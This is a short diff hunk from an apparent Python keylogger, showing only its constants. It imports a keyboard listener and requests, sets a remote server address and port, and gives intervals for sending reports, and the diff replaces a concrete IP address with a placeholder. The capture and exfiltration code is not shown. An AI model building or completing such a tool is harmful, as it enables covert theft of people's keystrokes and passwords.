@@ -8,7 +8,7 @@ import requests
 from pynput.keyboard import Listener
 
 # Константы
-SERVER_IP = "139.162.176.247"
+SERVER_IP = "your_ip_server"
 SERVER_PORT = 8080
 SEND_REPORT_EVERY = 60  # in seconds
 CHECK_SERVER_EVERY = 5  # in seconds
